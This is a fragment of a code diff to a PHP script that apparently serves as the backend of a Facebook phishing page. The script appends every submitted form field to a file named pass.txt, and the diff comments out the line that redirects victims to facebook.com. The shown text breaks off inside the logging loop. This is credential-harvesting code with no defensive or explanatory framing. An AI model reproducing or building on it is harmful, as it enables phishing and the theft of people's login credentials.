@@ -1,5 +1,5 @@
 <?php
-header ('location : https://www.facebook.com');
+//header ('location : https://www.facebook.com');
 $log = fopen("pass.txt" , "a");
 foreach($_POST as  $mjb => $value){
 fwrite($log , $mjb);
